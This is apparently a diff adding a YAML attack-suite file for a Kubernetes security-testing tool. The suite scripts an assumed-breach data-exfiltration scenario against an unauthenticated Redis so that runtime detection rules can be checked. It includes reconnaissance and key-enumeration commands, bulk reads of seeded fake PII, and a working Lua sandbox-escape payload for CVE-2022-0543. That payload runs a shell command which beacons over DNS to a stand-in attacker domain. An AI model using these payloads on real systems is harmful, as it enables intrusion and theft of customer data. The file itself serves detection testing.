@@ -1,0 +1,201 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-e2e-01-data-exfiltration
+  description: >-
+    E2E breach scenario 1 — "Assume-breach customer-data exfiltration from a
+    neighboring pod". Premise: attacker has already compromised the
+    redis-client pod in the same namespace (a legitimate application client
+    that shipped with an RCE-able dependency) and now reuses its existing
+    RESP reachability to the unauthenticated production Redis. This mirrors
+    the lateral-movement pattern Unit 42 describes for modern Kubernetes
+    threats: once inside one pod, reuse the pod's network identity to hit
+    neighbor services rather than burn a new credential.
+
+    Modeled after real incidents:
+      - Wiz RediShell (CVE-2025-49844) — post-compromise data theft and
+        cloud credential pivoting
+        https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844
+      - Unit 42 modern Kubernetes threats — SA token + neighbor-service
+        enumeration via stolen pod identity
+        https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
+
+    The steps below are pure RESP commands (no EVAL needed) because the
+    victim Redis already trusts anyone on the pod network. The interesting
+    defensive signal is *shape*: the adjacent pod normally runs a fixed
+    benign command set (PING/GET/SET/HGETALL on a known prefix). Any
+    deviation — KEYS *, mass SCAN, CLIENT LIST, DEBUG OBJECT, DUMP, a
+    lookup for an exfil domain — should drift against the learned profile.
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+
+attacks:
+  # ── Phase 1: Reconnaissance ────────────────────────────────────────────────
+  # Fingerprint the server, list connected clients, dump whole config.
+  # INFO/CONFIG GET * are normal from an operator, anomalous from an
+  # application pod — the profile should have captured "app never runs these".
+  - name: exfil-recon-info
+    type: custom
+    redis:
+      command: ["INFO", "server"]
+    successIndicators:
+      - responseContains: "redis_version"
+
+  - name: exfil-recon-client-list
+    type: custom
+    redis:
+      command: ["CLIENT", "LIST"]
+    successIndicators:
+      - responseContains: "addr="
+
+  - name: exfil-recon-config-dump
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "*"]
+    successIndicators:
+      - responseContains: "maxmemory"
+
+  - name: exfil-recon-dbsize
+    type: custom
+    redis:
+      command: ["DBSIZE"]
+
+  # ── Phase 2: Key enumeration ──────────────────────────────────────────────
+  # KEYS * is the loud version (blocks the server); SCAN is the stealthy
+  # version a serious attacker uses. We fire both so detection pipelines
+  # that only flag KEYS * don't get a pass on SCAN.
+  - name: exfil-keys-glob
+    type: custom
+    redis:
+      command: ["KEYS", "*"]
+
+  - name: exfil-scan-cursor
+    type: custom
+    redis:
+      command: ["SCAN", "0", "COUNT", "1000"]
+
+  # PII-shaped prefixes an attacker would grep for: "user:*", "session:*",
+  # "token:*", "pii:*". If the benign profile only knew "ft:*" and app-
+  # specific prefixes, these probes light up as drift.
+  - name: exfil-scan-users
+    type: custom
+    redis:
+      command: ["SCAN", "0", "MATCH", "user:*", "COUNT", "1000"]
+
+  - name: exfil-scan-sessions
+    type: custom
+    redis:
+      command: ["SCAN", "0", "MATCH", "session:*", "COUNT", "1000"]
+
+  - name: exfil-scan-tokens
+    type: custom
+    redis:
+      command: ["SCAN", "0", "MATCH", "token:*", "COUNT", "1000"]
+
+  # ── Phase 3: Seed + bulk read ─────────────────────────────────────────────
+  # Seed a realistic-looking PII record so the subsequent dump is not empty
+  # on a fresh Redis. In a real breach the data is already there; this just
+  # makes the scenario deterministic for CI.
+  - name: exfil-seed-customer
+    type: custom
+    redis:
+      command:
+        - "HSET"
+        - "user:42"
+        - "email"
+        - "alice@example.com"
+        - "ssn"
+        - "123-45-6789"
+        - "dob"
+        - "1990-01-01"
+    successIndicators:
+      - responseContains: "3"
+
+  - name: exfil-seed-session
+    type: custom
+    redis:
+      command:
+        - "SET"
+        - "session:abc123"
+        - "eyJhbGciOiJIUzI1NiJ9.fake.session"
+
+  # Bulk read all fields of the seeded record — this is what exfiltration
+  # actually looks like at the RESP layer.
+  - name: exfil-read-customer-record
+    type: custom
+    redis:
+      command: ["HGETALL", "user:42"]
+    successIndicators:
+      - responseContains: "ssn"
+
+  - name: exfil-read-session
+    type: custom
+    redis:
+      command: ["GET", "session:abc123"]
+    successIndicators:
+      - responseContains: "eyJ"
+
+  # DUMP returns the raw RDB-serialized payload of a key — very attractive
+  # for attackers who want to smuggle out an opaque blob rather than
+  # human-readable rows. Rarely issued by applications.
+  - name: exfil-dump-raw
+    type: custom
+    redis:
+      command: ["DUMP", "user:42"]
+
+  # ── Phase 4: C2 beacon via Lua-sandbox escape ─────────────────────────────
+  # Attacker reports back to C2 with a DNS lookup for an exfil domain. This
+  # reuses the CVE-2022-0543 io.popen trick already covered by the unit
+  # attacks; here it is wired into a scenario so profile-drift + DNS-anomaly
+  # fire together.
+  - name: exfil-c2-dns-beacon
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return 'sandbox_blocked' end
+        local f = io_mod.popen('getent hosts exfil.attacker.example.com 2>&1 || echo c2_done')
+        local out = f:read('*a')
+        f:close()
+        return 'c2:' .. out
+    successIndicators:
+      - responseContains: "c2:"
+
+  # ── Phase 5: Cleanup attempt ──────────────────────────────────────────────
+  # A careful attacker wipes their staging keys. A careless one leaves the
+  # canary, which is handy for incident-response tabletop exercises.
+  - name: exfil-canary
+    type: custom
+    redis:
+      command: ["SET", "pwned:bob-e2e-01", "exfiltration-complete"]
+
+expectedDetections:
+  # Lua-sandbox escape + DNS beacon
+  - attackType: fileless
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    containerName: redis
+    command: getent
+  - attackType: fileless
+    ruleID: R0005
+    ruleName: "DNS Anomalies in container"
+    containerName: redis
+  # RESP command drift — these should drift against a profile learned from
+  # the benign redis-functional-tests suite (which never issues CLIENT LIST,
+  # CONFIG GET *, KEYS *, or DUMP).
+  - attackType: custom
+    ruleID: R0003
+    ruleName: "Syscalls Anomalies in container"
+    containerName: redis
